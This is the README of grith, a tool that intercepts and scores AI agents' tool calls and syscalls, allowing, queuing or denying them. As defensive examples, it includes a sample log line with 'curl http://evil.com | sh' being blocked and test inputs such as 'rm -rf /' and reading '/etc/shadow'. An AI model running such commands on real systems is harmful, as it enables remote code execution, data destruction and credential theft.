# grith

**Zero Trust for AI Agents** — a security-first local platform that secures AI agent tool calls through a multi-filter proxy and OS-level CLI supervisor.

grith produces a single binary — the grith daemon — that sits between AI tools and your operating system, evaluating every file access, network call, shell command, and process spawn against a scoring engine before allowing it to proceed.

> **Currently supports Linux x86_64 only.** macOS (via Endpoint Security), Windows (via ETW), and Linux aarch64 are tracked for v2.0.

Two execution paths, one security proxy:

- **Built-in Agent** — grith's own LLM-driven agent routes every tool call through the security proxy before execution.
- **CLI Supervisor** — external tools (Claude Code, Codex, Aider, etc.) run under OS-level syscall interception. Every syscall is evaluated.

Both paths converge on the same proxy filters, scoring thresholds, audit log, and human-in-the-loop digest system.

## Features

- **Multi-phase security proxy** with 18 filters across 3 phases (static, pattern, context)
- **Secret scanning** with 1,620+ regex patterns for API keys, tokens, and credentials
- **Destructive-action coverage** — hard-denies catastrophic host/storage destruction (filesystem format, raw block-device overwrite, recursive removal of a system root or database data directory) and escalates destructive operations against production targets
- **Adaptive Bayesian scoring** that learns from human review decisions
- **Per-call security evaluation** with profile-based access control
- **CLI supervisor** with ptrace+seccomp (Linux x86_64, full syscall interception). macOS via Endpoint Security and Windows via ETW are targeted for v2.0; Linux aarch64 needs an arch-backend port.
- **Process tree tracking** — follows forks, clones, and execs
- **PTY forwarding** for transparent interactive tool sessions
- **Human-in-the-loop digest** — queued operations freeze the process until approved
- **Audit logging** — 100% of tool call evaluations recorded to SQLite
- **LLM routing** — Ollama, OpenAI, Anthropic, and OpenRouter support
- **Web dashboard** — React app served on `localhost:3141`
- **11 pre-built supervisor profiles** — generic, generic-cli, grith-repl, claude-code, codex, aider, goose, copilot, cursor, cline, and openclaw
- **Encrypted team key sync** for shared provider API key management
- **Syscall forensics** via `--trace-syscalls-jsonl` for machine-readable post-session analysis

## Install

The fastest way to install grith:

```bash
curl -fsSL https://grith.ai/install | sh
```

This auto-detects your platform, downloads the latest release binary, verifies the SHA-256 checksum, and installs to `~/.local/bin`. Options:

```bash
curl -fsSL https://grith.ai/install | sh -s -- --version <version> # specific version
curl -fsSL https://grith.ai/install | sh -s -- --global           # install to /usr/local/bin
```

**Other methods:**

| Method | Command |
|--------|---------|
| From source | See [Build from Source](#build-from-source) below |
| Manual | Download from [GitHub Releases](https://github.com/grith-ai/grith/releases) |

> Homebrew, Scoop, and winget integrations are deferred until macOS and
> Windows support land in v2.0.

### Supported platforms

| Platform | Architecture | Status |
|----------|-------------|--------|
| Linux | x86_64 | ✅ supported |
| Linux | aarch64 | ⏳ v2.0 — supervisor needs an aarch64 register backend |
| macOS | Apple Silicon / Intel | ⏳ v2.0 — supervisor needs Endpoint Security port |
| Windows | x86_64 | ⏳ v2.0 — supervisor needs ETW + a process-supervisor port |

## Build from Source

### Prerequisites

- **Rust** 1.88+ (stable)
- **Node.js** 22+ (for the web dashboard)
- **Linux** x86_64 kernel 4.8+ (for the ptrace+seccomp CLI supervisor)

### Quick build

```bash
git clone https://github.com/grith-ai/grith.git
cd grith
make dist
```

`make dist` builds the dashboard and produces the best available local dist archive for the current platform in `dist/release-artifacts/`. On Linux, it prefers the canonical musl release target and falls back to the native host target when `cross` is unavailable. `make dist-all` and CI remain the strict release-asset path.

### All build targets

```bash
make build          # Debug build (fast iteration)
make release        # Optimized release build
make dashboard      # Build React dashboard only
make install        # Release build + install to ~/.local/bin
make dist           # Build the best available local dist archive for the current platform
make dist-all       # Build archives for all 5 release targets (requires cross for Linux musl)
make dist-test      # Build + run the real installer against staged local release assets
make test           # Run all workspace tests
make lint           # cargo fmt check + clippy
make all            # lint → test → release → dashboard
```

### Manual build (without Make)

```bash
# Build the binary
cargo build --release -p grith-core

# Build the dashboard
cd dashboard && npm install && npm run build && cd ..
```

This compiles the `grith` binary to `target/release/grith`. That single binary contains the security proxy, audit system, CLI supervisor, LLM integration, and HTTP server. The dashboard builds to `dashboard/dist/` and runs as a background process managed via `grith dashboard start/stop/status`, auto-starting when `grith run` or `grith` (REPL) is invoked at `http://localhost:3141`.

### 3. Configure your LLM provider

grith needs an LLM backend to power its agent. Run `grith init` to create the config file, then set your provider:

```bash
./target/release/grith init
```

This creates `~/.config/grith/config.toml`. Open it and set the `[llm]` section for your provider.

#### Option A: Ollama (local, free, no API key)

Install [Ollama](https://ollama.com), pull a model, and start the server:

```bash
ollama pull llama3.1:8b
ollama serve
```

The default config already points to Ollama, so no config changes are needed:

```toml
[llm]
default_provider = "ollama"

[llm.ollama]
base_url = "http://localhost:11434"
model = "llama3.1:8b"
```

#### Option B: Anthropic (Claude)

```toml
[llm]
default_provider = "anthropic"

[llm.anthropic]
api_key = "sk-ant-..."
model = "claude-sonnet-4-20250514"
```

#### Option C: OpenAI (ChatGPT)

```toml
[llm]
default_provider = "openai"

[llm.openai]
api_key = "sk-..."
model = "gpt-4o"
```

#### API key resolution

For each provider, grith looks for the API key in this order:

1. `api_key` in the config file (as shown above)
2. Environment variable (e.g., `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `OPENROUTER_API_KEY`)

You can use either method. Environment variables are useful for CI or if you prefer not to store keys in config files:

```bash
export ANTHROPIC_API_KEY="sk-ant-..."
```

#### Quick override with environment variables

You can switch providers for a single run without editing the config:

```bash
GRITH_LLM_PROVIDER=anthropic ./target/release/grith run "list files in src/"
GRITH_LLM_PROVIDER=openai ./target/release/grith run "explain this codebase"
```

### 4. Run grith

```bash
# Start the daemon with interactive REPL + dashboard
./target/release/grith

# Or run a single task
./target/release/grith run "list all TODO comments in this project"

# Or supervise an external tool
./target/release/grith exec -- claude-code "refactor the auth module"
```

When the REPL or `run` command starts, grith launches the HTTP server on `localhost:3141` serving both the dashboard UI and the REST/WebSocket API.

## What runs when

| You run | What happens |
|---------|-------------|
| `grith` | Starts REPL + HTTP server on `:3141`. Dashboard served if built. |
| `grith run "task"` | Executes one task + HTTP server on `:3141`. |
| `grith exec -- <cmd>` | Supervises `<cmd>` under syscall interception. No HTTP server. |
| `grith audit` | Queries the local audit SQLite database. No HTTP server. |
| `grith log [--tail]` | Streams or lists audit-backed session logs. No HTTP server. |
| `grith supervisor list` | Lists active supervisor sessions from the registry. |

The HTTP server only starts for REPL and `run` modes. All other commands are standalone CLI operations.

## CLI Reference

```
grith                                        # Start interactive REPL + server
grith run <TASK>                             # Execute a single task + server
grith init                                   # Create default config
grith config                                 # Show current configuration
grith config set <KEY> <VALUE>               # Set a config value

grith exec -- <COMMAND> [ARGS...]            # Supervise an external tool
grith exec --profile <NAME> -- <CMD> [ARGS]  # Supervise with named profile
grith exec --attach <PID>                    # Attach to running process
grith exec --syscall-log <FILE> -- <CMD>     # Log all syscall decisions to file
grith exec --trace-syscalls-jsonl <FILE> -- <CMD>  # Machine-readable JSONL syscall trace

grith supervisor list                        # List active supervisor sessions
grith supervisor status <SESSION_ID>         # Show session details
grith supervisor kill <SESSION_ID>           # Terminate a session

grith audit                                  # Browse audit logs
grith audit export --format json             # Export audit logs
grith log --tail                             # Tail all session logs
grith log --tail --session grith-website     # Tail logs for one session name
grith log --session <SESSION_ID>             # Filter by UUID session id

grith digest                                 # Show digest queue
grith digest review                          # Interactive digest review

grith proxy test '<JSON>'                    # Dry-run a tool call
```

`grith log` shows all logs by default when `--session` is omitted. Session names are derived from the current folder name (for example `grith-website`).

### Exit codes

Most commands use standard exit codes: `0` for success, `1` for error.

`grith proxy test` uses distinct exit codes for scripting:

| Exit code | Meaning |
|-----------|---------|
| `0` | **Allow** — tool call scored below the allow threshold |
| `1` | **Queue** — tool call would be queued for human review |
| `2` | **Deny** — tool call scored above the deny threshold |

Example usage in a script:

```bash
grith proxy test '{"type": "FileRead", "path": "/etc/shadow"}'
case $? in
  0) echo "Allowed" ;;
  1) echo "Queued for review" ;;
  2) echo "Denied" ;;
esac
```

### Global flags

```
--config <PATH>       Path to configuration file
--log-level <LEVEL>   Log level: trace, debug, info, warn, error
--no-color            Disable colored output
```

## Configuration

grith reads configuration from (highest to lowest precedence):

1. CLI flags
2. Environment variables (`GRITH_*`)
3. Project-local `.grith/config.toml`
4. User config `~/.config/grith/config.toml`
5. Built-in defaults

### Example config

```toml
[general]
log_level = "info"
audit_sync = true               # set false to keep audit records local-only

[llm]
default_provider = "anthropic"  # ollama, openai, anthropic, openrouter

[llm.anthropic]
api_key = "sk-ant-..."          # or set ANTHROPIC_API_KEY env var
model = "claude-sonnet-4-20250514"

[llm.ollama]
base_url = "http://localhost:11434"
model = "llama3.1:8b"

[proxy]
auto_allow_threshold = 3.0   # Score below this = auto-allow
auto_deny_threshold = 8.0    # Score above this = auto-deny

[server]
enabled = true
host = "127.0.0.1"
port = 3141
dashboard_dir = "dashboard/dist"

# Optional native TLS for non-localhost exposure
# [server.tls]
# cert_path = "/etc/grith/tls/fullchain.pem"
# key_path = "/etc/grith/tls/privkey.pem"

[server.rate_limit]
enabled = true
general_rps = 100
write_rps = 10
proxy_test_rps = 20

[supervisor]
enabled = true
default_profile = "generic"
freeze_timeout_seconds = 300
max_concurrent_sessions = 4
pty_forwarding = true

[supervisor.noise_reduction]
batch_rapid_reads = true
batch_window_ms = 50
```

Set `general.audit_sync = false`, run `grith config set general.audit_sync false`, or export `GRITH_AUDIT_SYNC=false` to disable audit uploads and keep audit records local-only. This does not disable license validation traffic — see the [Licence lifecycle](https://docs.grith.ai/docs/pro/license-lifecycle) page on docs.grith.ai for the refresh cadence, offline behaviour, and air-gapped deployment path.

For production network exposure, terminate TLS either with `[server.tls]` or
through a reverse proxy. See the [Reverse proxy + TLS guide](https://docs.grith.ai/docs/guides/reverse-proxy-tls)
on docs.grith.ai for nginx and Caddy examples.

Pre-built configuration examples are in `config/examples/`:
- `strict.toml` — low thresholds, high security
- `permissive.toml` — higher thresholds, fewer interruptions
- `air-gapped.toml` — deny all network access

### Environment variables

| Variable | Description |
|----------|-------------|
| `GRITH_LOG_LEVEL` | Log level |
| `GRITH_AUDIT_SYNC` | Enable/disable audit upload to the grith cloud API |
| `GRITH_LLM_PROVIDER` | Default LLM provider |
| `GRITH_PROXY_ALLOW_THRESHOLD` | Auto-allow score threshold |
| `GRITH_PROXY_DENY_THRESHOLD` | Auto-deny score threshold |
| `GRITH_SERVER_PORT` | Dashboard port |
| `GRITH_SUPERVISOR_ENABLED` | Enable/disable supervisor |
| `GRITH_SUPERVISOR_TIMEOUT` | Freeze timeout (seconds) |

## Security Proxy

Every tool call — whether from the built-in agent or an intercepted syscall — is evaluated by the proxy's three-phase filter pipeline:

**Phase 1 — Static (<0.1ms):** Path matching (Aho-Corasick), allowlist/denylist, profile allowlists, argument structure validation.

**Phase 2 — Pattern (1-3ms):** Secret scanning (1,620+ regex patterns for API keys, tokens, credentials), command structure analysis, destructive-action coverage.

**Phase 3 — Context:** Reputation scoring, behavioral profiling, taint tracking, rate limiting.

Scores are additive across filters. The composite score determines the action:

| Score | Action | Effect |
|-------|--------|--------|
| < 3.0 | **Allow** | Operation proceeds |
| 3.0 - 8.0 | **Queue** | Process frozen, queued for human review |
| > 8.0 | **Deny** | Operation blocked (EPERM for supervisor, error for built-in agent) |

### Egress and containment options

Two new security controls are now configurable:

- `config/filters/egress.toml`
- `config/filters/containment.toml`

`egress.toml` adds protocol/domain/port policy for outbound channels (including command-token heuristics).
`containment.toml` adds session containment after sensitive reads so outbound sinks score into review/deny ranges for a configurable window.

### Testing the proxy

Dry-run a tool call without executing it:

```bash
# Test a file read
grith proxy test '{"type": "FileRead", "path": "/home/user/project/src/main.rs"}'

# Test a shell command
grith proxy test '{"type": "ShellExec", "command": "rm -rf /"}'

# Test a network request
grith proxy test '{"type": "HttpRequest", "url": "https://api.openai.com/v1/chat", "method": "POST"}'
```

## Supervisor Profiles

Profiles reduce noise by auto-allowing routine operations for known tools. Built-in profiles are in `config/supervisor/profiles.toml`:

| Profile | Tool | Description |
|---------|------|-------------|
| `generic` | Any tool | Minimal safe defaults (cat, ls, git) |
| `generic-cli` | CLI tools | Extended CLI defaults with broader shell access |
| `grith-repl` | grith REPL | Internal agent sessions |
| `claude-code` | Claude Code | Node.js/npm ecosystem, Anthropic API |
| `codex` | OpenAI Codex | Python/Node.js, OpenAI API |
| `aider` | Aider | Python/git-focused, multiple LLM providers |
| `goose` | Goose | Block's AI agent |
| `copilot` | GitHub Copilot | VS Code / JetBrains extension ecosystem |
| `cursor` | Cursor | Cursor editor AI agent |
| `cline` | Cline | VS Code Cline extension |
| `openclaw` | OpenClaw | OpenClaw agent |

Profiles are auto-detected from the command name. Override with `--profile`:

```bash
grith exec --profile claude-code -- node my-agent.js
```

Profile paths support `${PROJECT_DIR}` and `${HOME}` variable expansion.

For an overview of what each built-in profile auto-allows, see the [Supervisor profiles](https://docs.grith.ai/docs/concepts/supervisor-profiles) page on docs.grith.ai.

## Syscall Logging

Use `--syscall-log` to record every evaluated syscall and its decision to a file for post-session review:

```bash
grith exec --syscall-log /tmp/syscalls.log -- claude-code "refactor auth"
```

Each line contains a timestamp, decision, risk score, process ID, syscall type, and reason:

```
14:23:01.542  auto-allow        0.5  pid=12345     FileRead(/home/user/project/src/main.rs)  below threshold
14:23:01.891  auto-allow        1.2  pid=12345     NetConnect(api.anthropic.com:443)  below threshold
14:23:02.103  manual-allow      5.8  pid=12345     FileWrite(/home/user/project/src/auth.rs)  approve_and_learn
14:23:02.440  auto-deny         9.2  pid=12345     ShellExec(curl http://evil.com | sh)  command injection pattern
```

Decision markers:

| Marker | Meaning |
|--------|---------|
| `auto-allow` | Proxy score below allow threshold, permitted automatically |
| `auto-deny` | Proxy score above deny threshold, blocked automatically |
| `auto-allow-log` | Queue-range score in log mode, allowed but recorded for review |
| `manual-allow` | Queued for interactive review, user approved |
| `manual-deny` | Queued for interactive review, user denied or timed out |

## REST API

The HTTP server exposes 57+ REST endpoints on `localhost:3141`, including:

- **Session management** — create, list, and control agent and supervisor sessions
- **Audit** — query, export, and stream audit events
- **Digest** — queue management and interactive review
- **Proxy** — dry-run evaluation and filter introspection
- **Supervisor** — session lifecycle, profile management, registry
- **Analytics** — cost tracking, activity summaries, and compliance analytics
- **Dashboard** — serves the embedded React dashboard and WebSocket live updates

All endpoints require `localhost` origin by default. Optional TLS and rate limiting are configurable.

## Architecture

```
grith-core (binary)
├── grith-cli              Terminal REPL
├── grith-server            HTTP/WS server + dashboard
├── grith-llm               LLM provider abstraction
│   └── grith-proxy         Security proxy (shared)
│       ├── grith-audit     Audit logging
│       └── grith-digest    Human review queue
├── grith-supervisor        CLI supervisor (syscall interception)
│   └── grith-proxy         Security proxy (shared)
│       ├── grith-audit     Audit logging
│       └── grith-digest    Human review queue
└── grith-audit             Top-level audit access
```

Both the built-in agent and CLI supervisor route through the same `grith-proxy` instance with shared filters, scoring, audit, and digest.

## Performance Targets

| Metric | Target |
|--------|--------|
| Proxy latency | P95 < 15ms per tool call |
| False positive rate | < 5% after 200-call warm-up |
| False negative rate | < 0.1% of known-dangerous patterns |
| Memory footprint | < 150 MB RSS (daemon + proxy) |
| Plugin cold start | < 500ms first, < 1ms cached |
| Supervisor overhead | P95 < 50us per intercepted syscall |
| Supervisor wall-clock impact | < 5% slowdown |

## Status: Phases 1–16 + Production Hardening (17–22)

Phases 1–16 are complete. Phases 17–22 cover production hardening, enterprise features, and platform expansion.

### v1.6 — Exfiltration Containment (shipped)

- Protocol-aware outbound controls for HTTP(S), DNS, FTP/SFTP, SMTP, websocket, and shell-transport patterns
- Sink-side DLP scanning and irreversible secret redaction for arguments and previews
- Session containment mode after sensitive reads, with stricter outbound policy until review
- Destination trust policy (allowlist/denylist/trust tiers by domain, IP, CIDR)
- Canary token detection with runtime registry management (CLI/API) and automatic deny on detection
- Correlated source-to-sink audit evidence persisted in audit storage and exports

Detailed plan and checklist: `work/16-exfiltration-containment.md`.

## Development

The test suite contains 1,601+ tests across all crates.

```bash
make test                                       # Run all workspace tests
make lint                                       # cargo fmt check + clippy
cargo test -p grith-proxy                       # Test a single crate
cargo test -p grith-supervisor -- --ignored     # Run ignored tests (spawn real processes)
cargo run -- --config config/default.toml       # Run daemon in dev mode
cd dashboard && npm run dev                     # Dashboard dev server (hot reload)
```

## License

Repository code: [MPL-2.0](LICENSE)

Pro and Enterprise capabilities ship in the same binary and are unlocked by signed licenses. Hosted billing, license issuance, and cloud sync infrastructure are not part of this repository.
